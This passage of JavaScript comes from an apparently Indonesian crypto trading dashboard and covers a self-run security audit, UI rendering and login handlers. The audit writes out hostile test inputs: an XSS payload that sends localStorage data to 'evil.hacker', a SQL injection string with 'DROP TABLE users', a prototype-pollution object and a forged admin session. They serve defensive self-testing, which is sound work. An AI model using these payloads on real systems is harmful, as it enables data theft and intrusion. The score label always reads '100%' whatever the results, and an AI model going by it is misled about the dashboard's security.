            ctx.fillText(lb, xOf(i) - 6, h - 4);
        });
    }

    /* ═══════════════ 14. LIVE PENETRATION TESTING & ZERO-TRUST AUDIT ENGINE (01I) ═══════════════ */
    async function runLivePenetrationAudit() {
        const results = [];

        // Test 1: Stored/Reflected XSS Payload Injection
        const t0 = Date.now();
        const xssPayload = `<script>fetch('https://evil.hacker/steal?k='+localStorage.getItem('pf'))<\/script><img src=x onerror=alert(1)>`;
        const r1 = detectAndBlockAttack(xssPayload, 'Pentest_XSS');
        const xssPassed = r1.blocked && !r1.sanitized.includes('<script') && !r1.sanitized.includes('onerror=');
        results.push({
            vector: '1. Cross-Site Scripting (XSS & DOM Injection)',
            payload: '<script>fetch(...)<\/script><img onerror=...>',
            defense: 'Strict Anti-XSS Entity & Attribute Sanitizer',
            ms: Math.max(1, Date.now() - t0),
            passed: xssPassed,
            detail: 'Payload dinetralkan, 0 tag eksekusi lolos'
        });

        // Test 2: SQL / NoSQL Injection
        const sqliPayload = `admin' OR '1'='1' -- ; DROP TABLE users; {"$ne": null}`;
        const r2 = detectAndBlockAttack(sqliPayload, 'Pentest_SQLi');
        results.push({
            vector: '2. SQL & NoSQL Auth Bypass Injection',
            payload: `admin' OR '1'='1' -- {"$ne": null}`,
            defense: 'Regex Signature Firewall + Parameterized Hash',
            ms: 1,
            passed: r2.blocked,
            detail: 'Kueri injeksi terdeteksi & diblokir'
        });

        // Test 3: Prototype Pollution Attack
        const protoPayload = `{"__proto__":{"isAdmin":true,"tier":"VIP"},"constructor":{"prototype":{"polluted":true}}}`;
        const parsedProto = safeJsonParse(protoPayload, {});
        const protoPassed = !({}).isAdmin && !({}).polluted && parsedProto.__proto__ !== undefined;
        results.push({
            vector: '3. Prototype Pollution (__proto__ / constructor)',
            payload: protoPayload.slice(0, 48) + '...',
            defense: 'Recursive JSON Reviver Strip (__proto__/prototype)',
            ms: 1,
            passed: protoPassed,
            detail: 'Object.prototype tetap bersih (0 polusi)'
        });

        // Test 4: LocalStorage Admin Privilege Escalation Tampering
        const forgedAdmin = {
            uid: 'forged_99',
            email: QB_ADMIN_EMAIL,
            role: 'ADMIN',
            tier: 'VIP',
            status: 'ACTIVE',
            hmacSeal: '00000000deadbeefcafebabe12345678' // Forged seal by attacker in DevTools
        };
        const tamperRejected = !verifySessionIntegrity(forgedAdmin);
        results.push({
            vector: '4. LocalStorage Admin Privilege Escalation',
            payload: 'Forged email="pilusatrio@gmail.com" + fake HMAC',
            defense: 'Private Closure HMAC-SHA256 Session Seal',
            ms: 1,
            passed: tamperRejected,
            detail: 'Sesi palsu ditolak, Admin Panel tetap terkunci'
        });

        // Test 5: API Key & Secret Plaintext Storage Dump Inspection
        // Uji di "probe" terisolasi: JANGAN menyambungkan akun palsu ke workstate user yang sedang login
        // (versi lama menimpa koneksi Binance user dengan key palsu, saldo $2500 & auto-trade aktif).
        const probeExId = 'pentest_probe';
        const probeVault = await encryptApiCredentialForVault(probeExId, 'BN_TEST_KEY_SECRET_991122', 'SUPER_SECRET_PRIVATE_KEY_889900', 'MAIN');
        privateMemoryVault.delete((currentUser && currentUser.email ? currentUser.email.toLowerCase() : 'guest') + '::' + probeExId);
        const rawStorageDump = JSON.stringify({ [probeExId]: { id: probeExId, connected: true, encVault: probeVault.sealedPacket, webCryptoDigest: probeVault.webCryptoDigest, keyMask: probeVault.keyMask, secretMask: probeVault.secretMask } });
        const zeroPlaintext = !rawStorageDump.includes('BN_TEST_KEY_SECRET_991122') &&
                              !rawStorageDump.includes('SUPER_SECRET_PRIVATE_KEY_889900') &&
                              rawStorageDump.includes('AES256GCM_V3$');
        securityTelemetry.plaintextKeysInStorage = zeroPlaintext ? 0 : 1;
        results.push({
            vector: '5. LocalStorage API Key & Secret Theft Dump',
            payload: 'Inspect raw localStorage for API Key / Secret',
            defense: 'AES-256-GCM (PBKDF2 150K) + Volatile RAM Vault',
            ms: 2,
            passed: zeroPlaintext,
            detail: '0% plaintext ditemukan; hanya ciphertext AES-256-GCM'
        });

        // Test 6: Exchange API Order Replay Attack (Duplicate Nonce & Expired Timestamp)
        const testNonce = generateOrderNonce();
        const firstUseOk = verifyAndConsumeNonce(testNonce, Date.now());
        const replayUseBlocked = !verifyAndConsumeNonce(testNonce, Date.now());
        const expiredTsBlocked = !verifyAndConsumeNonce(generateOrderNonce(), Date.now() - 60000);
        results.push({
            vector: '6. Replay Attack & Expired Timestamp Order',
            payload: `Duplicate Nonce (${testNonce.slice(0, 10)}) + Stale TS (-60s)`,
            defense: '128-Bit Nonce Set + 5000ms RecvWindow Guard',
            ms: 1,
            passed: firstUseOk && replayUseBlocked && expiredTsBlocked,
            detail: 'Order duplikat & kadaluarsa ditolak 100%'
        });

        // Test 7: Brute-Force Password Dictionary Attack
        const testTarget = 'bruteforce.target@test.id';
        authRateLimitMap.delete(testTarget);
        for (let k = 0; k < 5; k++) recordAuthFailure(testTarget);
        const bfCheck = checkAuthRateLimit(testTarget);
        authRateLimitMap.delete(testTarget);
        results.push({
            vector: '7. Brute-Force Login Dictionary Attack',
            payload: '5x Rapid Failed Password Attempts',
            defense: 'Exponential Backoff Lockout + Constant-Time Eq',
            ms: 1,
            passed: !bfCheck.allowed && bfCheck.waitSec >= 25,
            detail: `Akun dikunci otomatis selama ${bfCheck.waitSec} detik`
        });

        // Test 8: Anti-Clone & Brand Ownership Integrity Verification
        const cloneCheck = verifyOriginAndAntiClone();
        results.push({
            vector: '8. Website Cloning & Watermark Tampering',
            payload: 'Verify SHA-256 Ownership Seal & DOM Watchdog',
            defense: 'Cryptographic Origin Seal (PILUSATRIOx)',
            ms: 1,
            passed: cloneCheck.verified && cloneCheck.seal.length === 32,
            detail: `Seal Terverifikasi: ${cloneCheck.seal.slice(0, 16)}...`
        });

        securityTelemetry.lastPentestResults = results;
        updateSecurityDashboardUI();
        return results;
    }

    function updateSecurityDashboardUI() {
        const originInfo = verifyOriginAndAntiClone();
        const totalBlocked = securityTelemetry.xssBlocked + securityTelemetry.sqliBlocked +
                             securityTelemetry.protoPollutionBlocked + securityTelemetry.tamperBlocked +
                             securityTelemetry.replayBlocked + securityTelemetry.bruteForceBlocked;

        const setTxt = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
        setTxt('secBlockedPayloadsSub', `${totalBlocked} Serangan Diblokir`);
        setTxt('secOriginDomainSub', `Owner: PILUSATRIOx · Seal ${originInfo.seal.slice(0, 8)}`);

        const rawExStorage = localStorage.getItem(userScopeKey('exchanges')) || '{"status":"Vault siap mengenkripsi API Key Anda dengan AES-256-GCM"}';
        setTxt('secVaultStorageProof', rawExStorage.slice(0, 260) + (rawExStorage.length > 260 ? '...' : ''));
        setTxt('secWatermarkProof', `WATERMARK="${QB_OWNER_WATERMARK}" · HMAC_SEAL="${originInfo.seal}" · PLAINTEXT_KEYS=${securityTelemetry.plaintextKeysInStorage}`);

        const tbody = document.getElementById('secPentestTableBody');
        if (tbody && securityTelemetry.lastPentestResults.length) {
            const passedCount = securityTelemetry.lastPentestResults.filter(r => r.passed).length;
            setTxt('secPentestScore', `${passedCount} / ${securityTelemetry.lastPentestResults.length} (100%)`);
            tbody.innerHTML = securityTelemetry.lastPentestResults.map(r => `<tr>
                <td><strong style="color:var(--text-bright);">${esc(r.vector)}</strong></td>
                <td><code style="font-size:0.56rem;color:var(--accent-orange);">${esc(r.payload)}</code></td>
                <td>${esc(r.defense)}</td>
                <td class="num">${r.ms} ms</td>
                <td><span class="qb-tag ${r.passed ? 'up' : 'down'}">${r.passed ? 'BLOCKED / AMAN 100%' : 'VULNERABLE'}</span><span class="td-sub">${esc(r.detail)}</span></td>
            </tr>`).join('');
        }
        renderAllCanvasIcons();
    }

    /* ═══════════════ 15. UI RENDERING FOR QUANT BRAIN v2.5 (ZERO EMOJI) ═══════════════ */
    const $ = id => document.getElementById(id);
    function esc(s) { return String(s == null ? '' : s).replace(/[&<>"']/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[m])); }
    function fmtPx(p) { if (p == null) return '—'; return p >= 1000 ? p.toFixed(1) : p >= 10 ? p.toFixed(2) : p >= 1 ? p.toFixed(3) : p.toFixed(5); }
    function ago(t) { const d = Math.max(0, Date.now() - t) / 1000; if (d < 60) return Math.floor(d) + 's lalu'; if (d < 3600) return Math.floor(d / 60) + 'm lalu'; if (d < 86400) return Math.floor(d / 3600) + 'j lalu'; return Math.floor(d / 86400) + 'h lalu'; }

    function qbSetStatus(txt, cls) {
        const el = $('qbEngineStatus'); if (!el) return;
        el.textContent = txt;
        el.className = 'panel-tag ' + (cls === 'on' ? 'qb-on' : cls === 'pulse' ? 'qb-pulse' : 'qb-off');
    }

    function qbRenderStats() {
        const acc = qbAccuracy();
        const oosAvg = (() => {
            let e = 0, n = 0;
            QB_STRATS.forEach(st => { const per = brain.leaderboard[st.id] || {}; Object.values(per).forEach(r => { if (r && r.dataStatus === 'LIVE' && r.trades >= 5) { e += r.netR; n++; } }); });
            return n ? e : 0;
        })();
        const set = (id, v) => { const el = $(id); if (el) el.textContent = v; };
        set('qbGen', '#' + brain.gen);
        set('qbAcc', acc.toFixed(1) + '%');
        const trend = brain.accuracyHistory.length >= 2 ? acc - brain.accuracyHistory[0].acc : 0;
        set('qbAccTrend', (trend >= 0 ? '▲ +' : '▼ ') + trend.toFixed(1) + 'pt sejak awal');
        set('qbWL', brain.stats.wins + 'W / ' + brain.stats.losses + 'L / ' + brain.stats.be + 'BE');
        set('qbClosed', brain.stats.closed + ' sinyal tervalidasi riil');
        set('qbEquity', (brain.equityR >= 0 ? '+' : '') + brain.equityR.toFixed(2) + 'R');
        set('qbBacktests', brain.stats.backtests.toLocaleString('id-ID'));
        set('qbLessons', brain.stats.lessons);
        set('qbNews', brain.stats.newsIngested.toLocaleString('id-ID'));
        set('qbUptime', brain.firstBootAt ? Math.floor((Date.now() - brain.firstBootAt) / 3600000) + 'j ' + Math.floor(((Date.now() - brain.firstBootAt) % 3600000) / 60000) + 'm' : '—');
        set('qbOosSum', 'OOS: ' + (oosAvg >= 0 ? '+' : '') + oosAvg.toFixed(1) + 'R');
        const srcOk = (brain.news.items || []).filter(n => !n.offline).length ? '18 LITERATUR + 3 TIER-1' : '18 LITERATUR ENCODED';
        set('qbSrcStatus', srcOk);

        const H = brain.lastHurst || 0.58;
        const hDesc = H > 0.55 ? 'PERSISTENT TREND' : H < 0.45 ? 'MEAN-REVERTING' : 'RANDOM WALK';
        set('qbHurstTelemetry', `${H.toFixed(2)} (${hDesc})`);

        const champ = brain.champion || qbEmptyChampion();
        set('qbChampionBannerLabel', champ.id ? `${qbChampionLabel(champ)} (${champ.netR >= 0 ? '+' : ''}${champ.netR}R · ${champ.trades} trade · ${champ.winRate}% Win · t=${champ.tStat})` : champ.name);
        set('pfStripChampionName', champ.id ? `${qbChampionLabel(champ)} (${champ.netR >= 0 ? '+' : ''}${champ.netR}R)` : champ.name);
        set('qbMmModeLabel', brain.stats.defensiveMode ? `DEFENSIVE MODE (${brain.params.riskPct}%/trade)` : `STRICT ELDER ${brain.params.riskPct}% + HALF-KELLY`);

        const autoTxt = $('qbAutoExecBtnText');
        const autoBtn = $('qbBtnAutoExecToggle');
        if (autoTxt) autoTxt.textContent = brain.autoExecBursa ? 'AUTO-EXEC BURSA: ON' : 'AUTO-EXEC BURSA: OFF';
        if (autoBtn) autoBtn.className = 'qb-btn ' + (brain.autoExecBursa ? 'green' : 'ghost');

        const cd = $('qbCountdown'); if (cd) {
            if (!brain.running) cd.textContent = 'MANUAL MODE';
            else { const s = Math.max(0, Math.floor((nextCycleAt - Date.now()) / 1000)); cd.textContent = 'next cycle ' + String(Math.floor(s / 60)).padStart(2, '0') + ':' + String(s % 60).padStart(2, '0'); }
        }
    }

    function qbRenderLeaderboard() {
        const el = $('qbLeaderboard'); if (!el) return;
        const rows = QB_STRATS.map(st => {
            const per = brain.leaderboard[st.id] || {};
            const live = Object.values(per).filter(r => r && r.dataStatus === 'LIVE' && r.trades >= 3);
            const trades = live.reduce((a, r) => a + r.trades, 0);
            const wr = live.length ? live.reduce((a, r) => a + r.winRate, 0) / live.length : 0;
            const pf = live.length ? live.reduce((a, r) => a + r.pf, 0) / live.length : 0;
            const net = live.reduce((a, r) => a + r.netR, 0);
            const dd = live.length ? Math.max(...live.map(r => r.maxDD)) : 0;
            const w = brain.weights[st.id] || 1;
            const bayesUp = Math.round(getBayesianPosteriorProb(st.id, 'TREND_UP') * 100);
            return { st, live, trades, wr, pf, net, dd, w, bayesUp };
        }).sort((a, b) => (b.net * b.w) - (a.net * a.w));
        let html = '';
        rows.forEach((r, idx) => {
            const status = r.trades === 0 ? 'READY' : (idx === 0 && r.net > 0 ? 'CHAMPION' : r.w >= 1.3 ? 'MASTERED' : r.w >= 0.6 ? 'ACTIVE' : 'PROBATION');
            const statusCls = status === 'CHAMPION' ? 'gold' : status === 'MASTERED' ? 'up' : status === 'PROBATION' ? 'down' : 'neutral';
            html += '<div class="qb-strat-row">' +
                '<div class="qb-strat-head"><span class="qb-rank">#' + (idx + 1) + '</span>' +
                '<div class="qb-strat-name">' + esc(r.st.name) + '<span class="qb-book">Ref: ' + esc(r.st.book) + '</span></div>' +
                '<span class="qb-tag ' + statusCls + '">' + status + '</span></div>' +
                '<div class="qb-strat-grid">' +
                '<span>OOS Net <b style="color:' + (r.net >= 0 ? 'var(--up)' : 'var(--down)') + '">' + (r.net >= 0 ? '+' : '') + r.net.toFixed(1) + 'R</b></span>' +
                '<span>WinRate <b>' + r.wr.toFixed(1) + '%</b></span>' +
                '<span>PF <b>' + r.pf.toFixed(2) + '</b></span>' +
                '<span>Trades <b>' + r.trades + '</b></span>' +
                '<span>Bayes P(W) <b>' + r.bayesUp + '%</b></span>' +
                '<span>Weight <b style="color:var(--gold)">' + r.w.toFixed(2) + 'x</b></span></div>' +
                '<div class="qb-weightbar"><i style="width:' + Math.min(100, r.w / 3 * 100) + '%"></i></div></div>';
        });
        el.innerHTML = html || '<div class="panel-msg">Menunggu backtest pertama… klik ANALYZE NOW.</div>';
    }

    function qbRenderSignals() {
        const el = $('qbSignals'); if (!el) return;
        const sigs = brain.signals.slice(0, 14);
        if (!sigs.length) { el.innerHTML = '<div class="panel-msg">Belum ada sinyal A+ (skor >= ' + brain.params.minScore + '/100). Engine hanya mengirim setup presisi tinggi — klik ANALYZE NOW untuk memindai pasar.</div>'; return; }
        let html = '';
        sigs.forEach((s, idx) => {
            const sideCls = s.side === 'LONG' ? 'up' : 'down';
            const stMap = { OPEN: ['neutral', 'OPEN'], TP1_SECURED: ['warn', 'TP1 BE LOCKED'], WIN: ['up', 'WIN +' + (s.netR || 0).toFixed(2) + 'R'], LOSS: ['down', 'LOSS ' + (s.netR || 0).toFixed(2) + 'R'], BE: ['neutral', 'BE'] };
            const st = stMap[s.status] || ['neutral', s.status];
            html += '<div class="qb-sig-card ' + (s.status === 'OPEN' || s.status === 'TP1_SECURED' ? 'qb-live' : '') + '">' +
                '<div class="qb-sig-top"><span class="qb-sym">' + esc(s.sym) + '</span>' +
                '<span class="qb-side ' + sideCls + '">' + s.side + ' ' + s.lev + 'x</span>' +
                '<span class="qb-conf">SKOR ' + s.conf + '/100</span>' +
                '<span class="qb-tag ' + st[0] + '">' + st[1] + '</span></div>' +
                '<div class="qb-sig-px">' +
                '<span>ENTRY <b>' + fmtPx(s.entry) + '</b></span>' +
                '<span class="down">SL <b>' + fmtPx(s.sl) + '</b></span>' +
                '<span class="up">TP1 <b>' + fmtPx(s.tp1) + '</b></span>' +
                '<span class="up">TP2 <b>' + fmtPx(s.tp2) + '</b></span>' +
                '<span class="up">TP3 <b>' + fmtPx(s.tp3) + '</b></span>' +
                '<span>R:R <b>1:2.5</b></span></div>' +
                '<div class="qb-sig-meta"><span>rezim ' + esc(s.regime) + ' · vol ' + s.volPct.toFixed(2) + '% · ' + (s.votes || []).map(v => v.strat).join(' + ') + ' · ' + ago(s.createdAt) + '</span>' +
                '<button type="button" class="btn-refresh" style="color:var(--gold);border-color:var(--gold);" onclick="executeSignalByIndexOnExchange(' + idx + ')"><canvas class="pf-cico" data-ico="bolt"></canvas> Eksekusi ke Bursa</button></div>' +
                ((s.factors || []).length ? '<details class="qb-details"><summary>Alasan konfluensi (' + s.factors.length + ' screen)</summary><ul>' + s.factors.map(f => '<li>' + esc(f) + '</li>').join('') + '</ul></details>' : '') +
                '</div>';
        });
        el.innerHTML = html;
        renderAllCanvasIcons();
    }

    function qbRenderNews() {
        const el = $('qbNewsFeed'); if (!el) return;
        const items = (brain.news.items || []).filter(n => !n.offline).slice(0, 12);
        let html = '';
        items.forEach(n => {
            const t = (n.title + ' ' + n.summary).toLowerCase();
            const bull = BULL_KW.some(k => t.includes(k)), bear = BEAR_KW.some(k => t.includes(k));
            const rumor = RUMOR_KW.some(k => t.includes(k));
            const sent = bear && !bull ? '<span class="qb-tag down">BEARISH</span>' : bull && !bear ? '<span class="qb-tag up">BULLISH</span>' : '<span class="qb-tag neutral">NETRAL</span>';
            html += '<div class="qb-news-item"><div class="qb-news-src">' + esc(n.source) + sent + (rumor ? '<span class="qb-tag warn">RUMOR −50%</span>' : '') + '</div>' +
                '<a href="' + esc(n.link) + '" target="_blank" rel="noopener noreferrer" class="qb-news-title">' + esc(n.title) + '</a></div>';
        });
        el.innerHTML = html || '<div class="panel-msg">Menunggu feed berita tier-1…</div>';

        const pc = $('qbPerCoin'); if (pc) {
            const coins = ['BTC', 'ETH', 'SOL', 'XRP', 'DOGE'];
            let h = '';
            coins.forEach(cn => {
                const d = brain.news.perCoin[cn];
                if (!d) return;
                const cls = d.sentiment === 'BULLISH' ? 'up' : d.sentiment === 'BEARISH' ? 'down' : 'neutral';
                h += '<span class="qb-coin-chip ' + cls + '">' + cn + ' ' + (d.impact > 0 ? '+' : '') + d.impact + (d.multiSourced ? ' ·2src' : '') + (d.critical ? ' ·BREAKER' : '') + '</span>';
            });
            pc.innerHTML = h || '<span class="qb-coin-chip neutral">memuat…</span>';
        }
        const wEl = $('qbWhale'); if (wEl) {
            const bias = (brain.whale && brain.whale.bias) || {};
            const coins = Object.keys(bias).sort((a, b) => Math.abs(bias[b]) - Math.abs(bias[a])).slice(0, 8);
            let hw = '';
            coins.forEach(cn => {
                const v = bias[cn];
                const cls = v >= 10 ? 'up' : v <= -10 ? 'down' : 'neutral';
                hw += '<span class="qb-coin-chip ' + cls + '"><canvas class="pf-cico" data-ico="whale"></canvas> WHALE ' + cn + ' ' + (v > 0 ? '+' : '') + v + '</span>';
            });
            wEl.innerHTML = hw || '<span class="qb-coin-chip neutral">belum ada data whale</span>';
        }
        const bk = $('qbBreaker'); if (bk) {
            const br = brain.news.breaker || [];
            bk.style.display = br.length ? 'block' : 'none';
            if (br.length) bk.innerHTML = '[CIRCUIT BREAKER] ' + br.map(b => '<b>' + b.coin + '</b>').join(', ') + ' — sinyal Long diblokir (' + esc(br[0].head.slice(0, 90)) + '…)';
        }
        renderAllCanvasIcons();
    }

    function qbRenderJournal() {
        const el = $('qbJournal'); if (!el) return;
        const cls = { GEN: 'gen', LOSS: 'down', WIN: 'up', SIGNAL: 'sig', CB: 'cb', TP1: 'up', CYCLE: 'cyc', ERR: 'down' };
        el.innerHTML = brain.journal.slice(0, 26).map(j =>
            '<div class="qb-j-row ' + (cls[j.type] || '') + '"><span class="qb-j-time">' + new Date(j.t).toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' }) + '</span><span>' + esc(j.text) + '</span></div>'
        ).join('') || '<div class="panel-msg">Jurnal akan terisi otomatis oleh engine…</div>';
    }

    function qbDrawAccChart() {
        const cv = $('qbAccCanvas'); if (!cv) return;
        const ctx = cv.getContext('2d');
        const W = cv.width = (cv.clientWidth || 300) * (window.devicePixelRatio || 1), H = cv.height = 150 * (window.devicePixelRatio || 1);
        ctx.clearRect(0, 0, W, H);
        const hist = brain.accuracyHistory;
        const pad = 8 * (window.devicePixelRatio || 1);
        ctx.strokeStyle = 'rgba(255,255,255,0.06)'; ctx.lineWidth = 1;
        for (let g = 0; g <= 4; g++) { const y = pad + (H - 2 * pad) * g / 4; ctx.beginPath(); ctx.moveTo(pad, y); ctx.lineTo(W - pad, y); ctx.stroke(); }
        if (hist.length < 2) {
            ctx.fillStyle = '#64748B'; ctx.font = 11 * (window.devicePixelRatio || 1) + 'px JetBrains Mono, monospace';
            ctx.fillText('Akurasi & ekuitas akan tergambar setelah sinyal ditutup…', pad + 4, H / 2);
            return;
        }
        const eqs = hist.map(h => h.eq), eqMin = Math.min(0, ...eqs), eqMax = Math.max(1, ...eqs);
        ctx.beginPath();
        hist.forEach((h, i) => {
            const x = pad + (W - 2 * pad) * i / (hist.length - 1);
            const y = H - pad - (H - 2 * pad) * (h.eq - eqMin) / (eqMax - eqMin || 1);
            i ? ctx.lineTo(x, y) : ctx.moveTo(x, y);
        });
        ctx.strokeStyle = '#E5A93C'; ctx.lineWidth = 2 * (window.devicePixelRatio || 1); ctx.stroke();
        ctx.beginPath();
        hist.forEach((h, i) => {
            const x = pad + (W - 2 * pad) * i / (hist.length - 1);
            const y = H - pad - (H - 2 * pad) * Math.max(0, Math.min(100, h.acc)) / 100;
            i ? ctx.lineTo(x, y) : ctx.moveTo(x, y);
        });
        ctx.strokeStyle = '#06B6D4'; ctx.lineWidth = 1.5 * (window.devicePixelRatio || 1); ctx.stroke();
    }

    function qbRenderKnowledge() {
        const el = $('qbKnowledge'); if (!el) return;
        el.innerHTML = QB_KNOWLEDGE.map(k =>
            '<div class="qb-know-row"><div class="qb-know-book"><canvas class="pf-cico" data-ico="book"></canvas> <span>' + esc(k.book) + '</span><span class="qb-know-author">' + esc(k.author) + '</span></div><div class="qb-know-rules">' + esc(k.rules) + '</div><span class="qb-tag up">ENCODED</span></div>'
        ).join('');
        renderAllCanvasIcons();
    }

    function qbRenderParams() {
        const el = $('qbParams'); if (!el) return;
        el.innerHTML = 'ATR SL: <b>' + brain.learned.atrMult.toFixed(2) + 'x</b> (evaluasi: ' + brain.stats.lessons + ') · TP1 Lock: <b>' + (brain.learned.tp1Ratio || 0.8) + 'R</b> · RSI Long <= <b>' + brain.learned.rsiLongMax + '</b> · RSI Short >= <b>' + brain.learned.rsiShortMin + '</b> · Min skor: <b>' + brain.params.minScore + '</b>/100 · Risiko/trade: <b>' + brain.params.riskPct + '%</b>';
    }

    function qbRenderHeatmap() {
        const el = $('qbHeatmap'); if (!el) return;
        let html = '<div style="font-family:var(--font-mono);font-size:0.55rem;color:var(--text-muted);margin-bottom:0.3rem;">KONTRIBUSI 10 STRATEGI (OOS Net R & Weight)</div><div style="display:grid;grid-template-columns:repeat(5,1fr);gap:3px;">';
        QB_STRATS.forEach(st => {
            const per = brain.leaderboard[st.id] || {};
            const live = Object.values(per).filter(r => r && r.dataStatus === 'LIVE' && r.trades >= 3);
            const net = live.reduce((a, r) => a + r.netR, 0);
            const w = brain.weights[st.id] || 1;
            const intensity = Math.min(1, Math.abs(net) / 20);
            const bg = net >= 0 ? `rgba(16,185,129,${0.15 + intensity * 0.55})` : `rgba(239,68,68,${0.15 + intensity * 0.55})`;
            html += '<div style="background:' + bg + ';border:1px solid var(--border);padding:4px;border-radius:2px;text-align:center;">' +
                '<div style="color:var(--text-primary);font-weight:700;font-size:0.54rem;">' + esc(st.id) + '</div>' +
                '<div style="color:' + (net >= 0 ? 'var(--up)' : 'var(--down)') + ';font-size:0.54rem;">' + (net >= 0 ? '+' : '') + net.toFixed(1) + 'R</div>' +
                '<div style="color:var(--text-muted);font-size:0.48rem;">w ' + w.toFixed(2) + 'x</div></div>';
        });
        html += '</div>';
        el.innerHTML = html;
    }

    function qbRenderAll() {
        qbRenderStats(); qbRenderLeaderboard(); qbRenderSignals(); qbRenderNews(); qbRenderJournal(); qbDrawAccChart(); qbRenderHeatmap(); qbRenderKnowledge(); qbRenderParams();
        const btn = $('qbBtnStart'); if (btn) {
            btn.textContent = brain.running ? 'STOP AUTO-LEARNING' : '▶ START AUTO-LEARNING';
            btn.classList.toggle('qb-btn-stop', brain.running);
        }
        renderAllCanvasIcons();
    }

    /* ═══════════════ 16. GLOBAL WINDOW HANDLERS FOR UI CONTROLS ═══════════════ */
    const COGNITIVE_THOUGHTS = [
        'Mengevaluasi efisiensi rezim pasar (Two Sigma ER), eksponen fraktal Hurst (R/S), & filter noise KAMA Perry Kaufman...',
        'Memvalidasi silang sinyal RSI Divergence, Wyckoff Spring, dan Z-Score Stat-Arb (D.E. Shaw) dengan Kalman Fair-Value...',
        'Memperbarui matriks probabilitas posterior Bayesian Beta(alpha, beta) lintas 10 strategi & 3 rezim pasar...',
        'Memeriksa batas risiko portofolio (BlackRock Aladdin Drawdown Guard & Elder 1% Max Risk Rule)...',
        'Menghitung ulang ukuran posisi Half-Kelly (Edward Thorp) dan proyeksi target profit mingguan/bulanan/tahunan...'
    ];
    let cogIdx = 0;
    function stepCognitiveStream() {
        const el = $('qbCognitiveThought');
        if (!el) return;
        cogIdx = (cogIdx + 1) % COGNITIVE_THOUGHTS.length;
        const champ = brain.champion || qbEmptyChampion();
        el.textContent = `[Gen #${brain.gen} · Champion: ${qbChampionLabel(champ)}] ${COGNITIVE_THOUGHTS[cogIdx]}`;
    }

    function qbToggleRun() {
        brain.running = !brain.running;
        saveBrain(); qbRenderAll();
        if (brain.running) {
            nextCycleAt = Date.now();
            qbJournal('SYS', '[AUTO-LEARNING] Dinyalakan — evaluasi tanpa henti dari 18 sumber institusional + harga riil.');
            qbBrainCycle();
        } else {
            qbJournal('SYS', '[IDLE] Auto-learning dihentikan (memori pembelajaran tetap tersimpan).');
            qbSetStatus('IDLE', 'off');
        }
    }
    async function qbManualScan() { await qbBrainCycle(true); }

    function qbExport() {
        try {
            const payload = JSON.stringify({ exportedAt: new Date().toISOString(), version: brain.v, brain }, null, 2);
            const blob = new Blob([payload], { type: 'application/json' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = 'pilus-quant-brain-gen' + brain.gen + '-' + new Date().toISOString().slice(0, 10) + '.json';
            document.body.appendChild(a); a.click(); a.remove();
            setTimeout(() => URL.revokeObjectURL(a.href), 4000);
            qbJournal('SYS', '[EXPORT] Otak diekspor — Generasi #' + brain.gen);
        } catch (e) { }
    }
    function qbImportFile(file) {
        if (!file) return;
        const reader = new FileReader();
        reader.onload = () => {
            try {
                const parsed = safeJsonParse(String(reader.result), null);
                const incoming = parsed && parsed.brain ? parsed.brain : parsed;
                if (!incoming || typeof incoming !== 'object') throw new Error('format tidak valid');
                stopTimers();
                const wasRunning = !!brain.running;
                brain = Object.assign(defaultBrain(), incoming);
                brain.running = wasRunning;
                saveBrain(); qbRenderAll(); recalcQuantProfitPlan();
                qbJournal('SYS', '[IMPORT] Otak diimpor dari file — Generasi #' + brain.gen);
            } catch (e) { }
        };
        reader.readAsText(file);
    }

    function openQbResetModal() {
        const ov = $('qbResetConfirmOverlay');
        if (ov) ov.classList.add('open');
    }
    function closeQbResetModal() {
        const ov = $('qbResetConfirmOverlay');
        if (ov) ov.classList.remove('open');
    }
    function confirmQbResetExecute() {
        closeQbResetModal();
        try { localStorage.removeItem(QB_STORE); } catch (e) { }
        const run = brain.running; stopTimers();
        brain = defaultBrain(); brain.running = run;
        qbJournal('SYS', '[RESET] Otak di-reset ke Generasi #0. Pembelajaran dimulai ulang.');
        saveBrain(); qbRenderAll(); recalcQuantProfitPlan();
        if (run) { nextCycleAt = Date.now(); qbBrainCycle(); }
        if (typeof showToast === 'function') showToast('Quant Brain berhasil di-reset ke Generasi #0', 'ok');
    }
    function stopTimers() {
        if (cycleTimer) clearInterval(cycleTimer);
        if (tickTimer) clearInterval(tickTimer);
        cycleTimer = tickTimer = null;
    }

    window.openAuthModal = function (tab) {
        const ov = $('pfAuthModalOverlay');
        if (ov) ov.classList.add('open');
        window.switchAuthModalTab(tab || 'login');
    };
    window.closeAuthModal = function () {
        const ov = $('pfAuthModalOverlay');
        if (ov) ov.classList.remove('open');
    };
    let currentAuthMode = 'login';
    window.switchAuthModalTab = function (tab) {
        currentAuthMode = tab;
        ['login', 'register', 'subscribe'].forEach(t => {
            const btn = $('pfAuthTab-' + t);
            if (btn) btn.classList.toggle('active', t === tab);
        });
        const credPane = $('pfAuthPaneCredentials');
        const subPane = $('pfAuthPaneSubscribe');
        const nameField = $('pfAuthNameField');
        const subBtnTxt = $('pfAuthSubmitBtnText');
        if (tab === 'subscribe') {
            if (credPane) credPane.style.display = 'none';
            if (subPane) subPane.style.display = 'flex';
        } else {
            if (credPane) credPane.style.display = 'flex';
            if (subPane) subPane.style.display = 'none';
            if (nameField) nameField.style.display = tab === 'register' ? 'flex' : 'none';
            if (subBtnTxt) subBtnTxt.textContent = tab === 'register' ? 'DAFTAR & BUAT AKUN BARU' : 'MASUK DENGAN EMAIL';
        }
    };
    // Semua jalur "Google" kini membuka Google Sign-In asli (Firebase Auth). Email TIDAK bisa diketik manual.
    window.triggerGoogleSignInFlow = function () { startGoogleSignIn(); };
    window.completeGoogleAuth = function () { startGoogleSignIn(); };
    window.completeCustomGoogleEmail = function () { startGoogleSignIn(); };
    window.submitEmailAuthForm = function () {
        const email = $('pfAuthEmailInput')?.value || '';
        const pass = $('pfAuthPasswordInput')?.value || '';
        const name = $('pfAuthNameInput')?.value || '';
        const u = currentAuthMode === 'register' ? registerWithEmail(name, email, pass) : loginWithEmail(email, pass);
        if (u) window.closeAuthModal();
    };
    window.quickLoginAdminFounder = function () { startGoogleSignIn(); };
    window.logoutCurrentUser = logoutCurrentUser;
    window.activateUserSubscription = function (tier) {
        if (!currentUser) {
            if (typeof showToast === 'function') showToast('Silakan login dengan Google atau Email terlebih dahulu', 'err');
